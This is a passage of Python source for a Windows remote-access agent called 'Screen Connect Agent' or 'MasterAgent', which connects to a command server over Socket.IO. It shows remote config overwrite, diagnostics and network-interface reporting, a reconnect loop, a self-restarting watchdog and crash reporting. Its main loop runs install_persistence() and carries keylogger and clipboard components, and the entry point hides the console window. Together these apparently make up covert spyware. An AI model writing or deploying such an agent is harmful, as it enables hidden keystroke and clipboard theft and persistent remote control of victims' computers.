            # Optionally show OSD overlay on agent desktop (best-effort)
            # No-op if no OSD engine available

        # ── v14: Connection quality ping handler ────────────────────────────
        @sio.on("quality_ping")
        def on_quality_ping(data):
            """Server probes round-trip. Agent echoes back immediately."""
            sio.emit("quality_pong", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "ts":        data.get("ts", 0),
                "server_ts": data.get("server_ts", ""),
            })

        # ── v14: Server-side config hot-reload (from SSE or direct event) ───
        @sio.on("config_update")
        def on_config_update(data):
            """Server pushed a config update via Socket.IO."""
            cfg = data.get("config", {})
            changed = []
            for k, v in cfg.items():
                if k in CONFIG and CONFIG[k] != v:
                    old = CONFIG[k]
                    CONFIG[k] = v
                    changed.append(f"{k}:{old}→{v}")
            if changed:
                log.info(f"Config hot-reload: {changed}")
                sio.emit("config_ack", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "changed":   changed,
                    "ts":        datetime.utcnow().isoformat(),
                })

        # ── v14: Memory pressure check before stream ────────────────────────
        @sio.on("memory_report_request")
        def on_memory_report(data):
            """Server requesting memory snapshot."""
            vm = psutil.virtual_memory()
            pressure = _check_memory_pressure()
            sio.emit("memory_report", {
                "device_id":     CONFIG["DEVICE_TOKEN"],
                "ram_pct":       vm.percent,
                "ram_avail_mb":  round(vm.available / (1024**2), 1),
                "pressure":      pressure,
                "threshold_pct": _MEM_PRESSURE_PCT,
                "ts":            datetime.utcnow().isoformat(),
            })
            if pressure:
                log.warning(f"Memory pressure: {vm.percent:.0f}% — stream quality auto-reduced")
                CONFIG["STREAM_QUALITY"] = max(50, CONFIG["STREAM_QUALITY"] - 20)
                CONFIG["STREAM_FPS"]     = max(CONFIG["STREAM_MIN_FPS"], CONFIG["STREAM_FPS"] - 10)

        # ── v14: Preflight self-test on demand ─────────────────────────────
        @sio.on("preflight_request")
        def on_preflight_request(data):
            def _run():
                result = _preflight_check()
                sio.emit("preflight_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **result,
                })
            threading.Thread(target=_run, daemon=True, name="preflight").start()

        # ── v14: Network change probe ───────────────────────────────────────
        @sio.on("network_info_request")
        def on_network_info(data):
            addrs_map = {}
            try:
                for iface, addrs in psutil.net_if_addrs().items():
                    addrs_map[iface] = [{"ip": a.address, "netmask": a.netmask}
                                        for a in addrs if a.family == socket.AF_INET]
            except Exception as e:
                addrs_map = {"error": str(e)}
            sio.emit("network_info", {
                "device_id":  CONFIG["DEVICE_TOKEN"],
                "interfaces": addrs_map,
                "ts":         datetime.utcnow().isoformat(),
            })

        # ── v14: Guest token validation gate ───────────────────────────────
        @sio.on("validate_session")
        def on_validate_session(data):
            """Server asks agent to confirm viewer session is still valid."""
            viewer_sid = data.get("viewer_sid", "")
            sio.emit("session_valid", {
                "device_id":  CONFIG["DEVICE_TOKEN"],
                "viewer_sid": viewer_sid,
                "valid":      True,
                "ts":         datetime.utcnow().isoformat(),
            })

        # ── v14: Adaptive quality pong handler ─────────────────────────────
        @sio.on("agent_pong_quality")
        def on_agent_pong_quality(data):
            rtt = (time.time() - float(data.get("ts", time.time()))) * 1000
            if quality_rep:
                quality_rep.record_rtt(rtt)
            _adapt_quality_for_rtt(rtt)

        # ── v14: Live diagnostics stream ───────────────────────────────────
        @sio.on("diagnostics_request")
        def on_diagnostics_request(data):
            """Server requests a full diagnostics bundle."""
            def _collect():
                try:
                    vm    = psutil.virtual_memory()
                    cpu   = psutil.cpu_percent(interval=0.5, percpu=True)
                    disk  = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\")
                    net   = psutil.net_io_counters()
                    procs = len(psutil.pids())
                    threads = threading.active_count()
                    bundle = {
                        "device_id":    CONFIG["DEVICE_TOKEN"],
                        "agent_version":CONFIG["AGENT_VERSION"],
                        "server_url":   CONFIG["SERVER_URL"],
                        "hostname":     socket.gethostname(),
                        "os":           platform.version(),
                        "cpu_per_core": cpu,
                        "ram_pct":      vm.percent,
                        "ram_used_gb":  round(vm.used / (1024**3), 2),
                        "disk_pct":     disk.percent,
                        "net_sent_mb":  round(net.bytes_sent / (1024**2), 1),
                        "net_recv_mb":  round(net.bytes_recv / (1024**2), 1),
                        "process_count":procs,
                        "thread_count": threads,
                        "stream_fps":   CONFIG.get("STREAM_FPS"),
                        "stream_q":     CONFIG.get("STREAM_QUALITY"),
                        "stream_mon":   CONFIG.get("STREAM_MONITOR"),
                        "adv_authed":   _adv_authed,
                        "adv_viewers":  _adv_viewers,
                        "ts":           datetime.utcnow().isoformat(),
                    }
                    sio.emit("diagnostics_result", bundle)
                except Exception as e:
                    sio.emit("diagnostics_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "error": str(e)
                    })
            threading.Thread(target=_collect, daemon=True, name="diag").start()

    # ── Main Run Loop ─────────────────────────────────────────────────────
    def run(self):
        log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
        # ── v14: Load persisted config ──
        _load_config_secure()
        if CONFIG["DEVICE_TOKEN"] == "UNSET-RUN-VIA-SERVER":
            log.warning("="*60)
            log.warning("DEVICE_TOKEN is not set! Run with a real token:")
            log.warning("  python agent_source.py MV-XXXXXX-XXXXXX-XXXXXX")
            log.warning("  or set env var: MVIEW_TOKEN=MV-XXXXXX-XXXXXX-XXXXXX")
            log.warning("="*60)
        install_persistence()
        # Note: start_advanced_monitor() is now called inside the connect() event
        # handler so the main socket registers agent_connect first (race fix)
        time.sleep(CONFIG["STARTUP_DELAY"])
        # ── v14: Pre-flight diagnostics ──
        threading.Thread(target=_preflight_check, daemon=True, name="preflight-boot").start()

        while not self._stop_flag.is_set():
            sio = sys_monitor = heartbeat = keylogger = clipboard = alerts = None
            quality_rep = net_detector = None
            try:
                sio, sys_monitor, heartbeat, keylogger, clipboard, alerts, \
                    quality_rep, net_detector = self._make_client()
                
                url = CONFIG["SERVER_URL"].rstrip("/")
                
                log.info(f"Connecting to {url}...")
                sio.connect(
                    url,
                    transports=["websocket", "polling"],
                    wait_timeout=30,
                    socketio_path="/socket.io",
                    headers={"User-Agent": f"MasterAgent/{CONFIG.get('AGENT_VERSION','8')}"},
                )
                sio.wait()
            except socketio.exceptions.ConnectionError as e:
                log.warning(f"Connection error: {e}")
            except Exception as e:
                log.error(f"Agent error: {e}")
            finally:
                for comp in [sys_monitor, heartbeat, keylogger, clipboard, alerts,
                              quality_rep, net_detector]:
                    try:
                        if comp and hasattr(comp, "stop"):
                            comp.stop()
                    except Exception:
                        pass

            if self._stop_flag.is_set():
                break

            jitter = random.uniform(0, self._reconnect_delay * 0.3)
            delay  = self._reconnect_delay + jitter
            log.info(f"Reconnecting in {delay:.1f}s...")
            time.sleep(delay)
            self._reconnect_delay = min(self._reconnect_delay * 2, CONFIG["RECONNECT_MAX"])

    def stop(self):
        self._stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
#  WATCHDOG — restarts agent thread if it dies
# ════════════════════════════════════════════════════════════════════════════
def _watchdog(agent_thread_ref: list):
    """
    Enterprise watchdog — checks every 30s:
    1. Agent main thread alive → restart if dead
    2. Adv monitor thread alive → restart if dead
    3. Send HTTP keep-alive to Render so server never cold-starts
       (Render free tier spins down after 15min inactivity)
    4. Clean PID file on clean exit
    """
    time.sleep(30)
    _last_keepalive = 0.0
    while True:
        time.sleep(15)  # v10: check every 15s (was 30s)
        now = time.monotonic()

        # ── Keep Render server awake every 10 min ─────────────────────────
        if now - _last_keepalive > 600:
            try:
                requests.get(
                    CONFIG["SERVER_URL"].rstrip("/") + "/status",
                    timeout=8, headers={"User-Agent": "MasterAgent-Keepalive/1.0"}
                )
                _last_keepalive = now
            except Exception:
                pass

        # ── Restart agent thread if dead ──────────────────────────────────
        t = agent_thread_ref[0]
        if t and not t.is_alive():
            log.warning("Watchdog: agent thread died — restarting...")
            try:
                new_agent  = ScreenConnectAgent()
                new_thread = threading.Thread(target=new_agent.run, daemon=False, name="sc-main")
                new_thread.start()
                agent_thread_ref[0] = new_thread
                log.info("Watchdog: agent thread restarted successfully")
            except Exception as e:
                log.error(f"Watchdog restart failed: {e}")

        # ── Restart adv monitor thread if dead ────────────────────────────
        global _adv_thread, _adv_monitor_started
        if _adv_thread and not _adv_thread.is_alive() and _adv_monitor_started:
            log.warning("Watchdog: adv monitor thread died — restarting...")
            _adv_monitor_started = False
            try:
                start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"])
                log.info("Watchdog: adv monitor restarted successfully")
            except Exception as e:
                log.error(f"Watchdog: adv monitor restart failed: {e}")


# ════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════════════════════
def _write_crash_report(exc_type, exc_val, exc_tb):
    """Write a full crash report to disk and notify server."""
    import traceback as _tb
    crash_dir  = Path(r"C:\Users\Public\mview")
    crash_dir.mkdir(parents=True, exist_ok=True)
    crash_file = crash_dir / f"crash_{int(time.time())}.txt"
    report = (
        f"MasterAgent Crash Report\n"
        f"========================\n"
        f"Time     : {datetime.now().isoformat()}\n"
        f"Version  : {CONFIG.get('AGENT_VERSION','?')}\n"
        f"Device   : {CONFIG.get('DEVICE_TOKEN','?')}\n"
        f"Host     : {socket.gethostname()}\n"
        f"\nTraceback:\n"
        + "".join(_tb.format_exception(exc_type, exc_val, exc_tb))
    )
    try:
        crash_file.write_text(report, encoding="utf-8")
    except Exception:
        pass
    # Keep only last 5 crash reports
    try:
        crashes = sorted(crash_dir.glob("crash_*.txt"))
        for old in crashes[:-5]: old.unlink(missing_ok=True)
    except Exception:
        pass
    log.critical(f"CRASH: {exc_val}  — report: {crash_file}")
    # Try to ping server with crash info
    try:
        requests.post(
            CONFIG["SERVER_URL"].rstrip("/") + "/agent/crash",
            json={
                "device_id": CONFIG.get("DEVICE_TOKEN"),
                "error":     str(exc_val),
                "type":      str(exc_type.__name__),
            },
            timeout=5,
        )
    except Exception:
        pass


def _global_exception_handler(exc_type, exc_val, exc_tb):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_val, exc_tb)
        return
    _write_crash_report(exc_type, exc_val, exc_tb)


if __name__ == "__main__":
    # ── SINGLE-INSTANCE GATE ─────────────────────────────────────────────
    # Check BEFORE acquiring lock. If another live agent is already running,
    # exit silently — no double-agent, no flickering, no orphan processes.
    if _is_already_running():
        # Optionally bring existing window to front (best-effort)
        try:
            import ctypes as _ct2
            _ct2.windll.user32.ShowWindow(
                _ct2.windll.kernel32.GetConsoleWindow(), 9  # SW_RESTORE
            )
        except Exception:
            pass
        sys.exit(0)
    _acquire_single_instance_lock()

    # Install global crash handler
    sys.excepthook = _global_exception_handler

    # Graceful shutdown on SIGTERM / SIGINT (Ctrl-C or OS kill)
    import signal as _sig
    def _graceful_shutdown(signum, frame):
        log.info(f"Signal {signum} received — shutting down gracefully...")
        try: os.unlink(_PID_FILE)
        except Exception: pass
        sys.exit(0)
    _sig.signal(_sig.SIGTERM, _graceful_shutdown)
    _sig.signal(_sig.SIGINT,  _graceful_shutdown)

    # Hide console window on Windows
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

    log.info(
        f"═══ MasterAgent v{CONFIG.get('AGENT_VERSION','?')} starting "
        f"| host={socket.gethostname()} | pid={os.getpid()}"
        f"| server={CONFIG['SERVER_URL']} | device={CONFIG['DEVICE_TOKEN'][:12]}... ═══"
    )

    agent        = ScreenConnectAgent()
    agent_thread = threading.Thread(target=agent.run, daemon=False, name="sc-main")
    agent_ref    = [agent_thread]
    agent_thread.start()

    watchdog_thread = threading.Thread(
        target=_watchdog, args=(agent_ref,), daemon=True, name="sc-watchdog"
    )
    watchdog_thread.start()

    agent_thread.join()
    # Clean up PID file on graceful exit
    try: os.unlink(_PID_FILE)
    except Exception: pass
